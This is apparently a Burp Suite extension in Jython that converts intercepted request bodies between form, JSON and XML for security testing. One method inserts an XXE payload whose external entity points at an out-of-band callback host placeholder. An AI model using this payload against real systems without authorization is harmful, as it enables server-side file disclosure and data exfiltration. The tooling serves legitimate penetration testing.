class BurpExtender(IBurpExtender, IContextMenuFactory):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        print "load convert plugin success"

        self._callbacks.setExtensionName("Convert")
        self._callbacks.registerContextMenuFactory(self)

    def createMenuItems(self, invocation):
        menu_list = ArrayList()
        messageInfo = invocation.getSelectedMessages()[0]

        if invocation.getToolFlag() == 64:
            menu_list.add(
                JMenuItem("TO XML", None, actionPerformed=lambda x, mess=messageInfo: self.convertToXML(mess)))
            menu_list.add(
                JMenuItem("TO JSON", None, actionPerformed=lambda x, mess=messageInfo: self.convertToJSON(mess)))
            menu_list.add(
                JMenuItem("ADD XXE PAYLOAD", None, actionPerformed=lambda x, invocation=invocation: self.PasteXXE(invocation)))
        return menu_list

    def getBodyParam(self, analyzeRequest):
        Parameters = analyzeRequest.getParameters()
        ParametersBody = {}
        for i in Parameters:
            if int(i.getType()) == 1:
                ParametersBody[i.getName()] = i.getValue()
        return ParametersBody

    def convertToXML(self, messageInfo):
        request = messageInfo.getRequest()
        analyzeRequest = self._helpers.analyzeRequest(request)
        headers = analyzeRequest.getHeaders()
        BodyOffset = analyzeRequest.getBodyOffset()
        content_type = analyzeRequest.getContentType()
        body = request[BodyOffset:].tostring().strip()

        ## body Parsed
        if content_type == 1:
            ParametersBody = self.getBodyParam(analyzeRequest)
            ParametersBody = {'root': ParametersBody}
            xmlString = unparse(ParametersBody, pretty=True)
        elif content_type == 4:
            ParametersBody = json.loads(body)
            ParametersBody = {'root': ParametersBody}
            xmlString = unparse(ParametersBody, pretty=True)
        else:
            print "cannot convert this content-type"
            return
        newBody = xmlString
        for i, val in enumerate(headers):
            if val.startswith("Content-Type"):
                headers[i] = "Content-Type: application/xml;charset=UTF-8"
        req = self._helpers.buildHttpMessage(headers, self._helpers.stringToBytes(newBody))
        messageInfo.setRequest(req)

    def convertToJSON(self, messageInfo):
        request = messageInfo.getRequest()
        analyzeRequest = self._helpers.analyzeRequest(request)
        headers = analyzeRequest.getHeaders()
        BodyOffset = analyzeRequest.getBodyOffset()
        content_type = analyzeRequest.getContentType()
        body = request[BodyOffset:].tostring().strip()
        ## body Parsed
        if content_type == 1:
            ParametersBody = self.getBodyParam(analyzeRequest)
            jsonString = json.dumps(ParametersBody)
        else:
            print "cannot convert this content-type"
            return
        newBody = jsonString
        for i, val in enumerate(headers):
            if val.startswith("Content-Type"):
                headers[i] = "Content-Type: application/json;charset=UTF-8"
        req = self._helpers.buildHttpMessage(headers, self._helpers.stringToBytes(newBody))
        messageInfo.setRequest(req)

    def PasteXXE(self,invocation):
        messageInfo = invocation.getSelectedMessages()[0]
        request = messageInfo.getRequest()
        start = invocation.getSelectionBounds()[0]
        end = invocation.getSelectionBounds()[1]
        xxe = "<!DOCTYPE copyright [<!ENTITY % remote SYSTEM \"{cloudeye}\">%remote;]>"
        xxeBytes = self._helpers.stringToBytes(xxe)
        request[start:end] = xxeBytes
        messageInfo.setRequest(request)
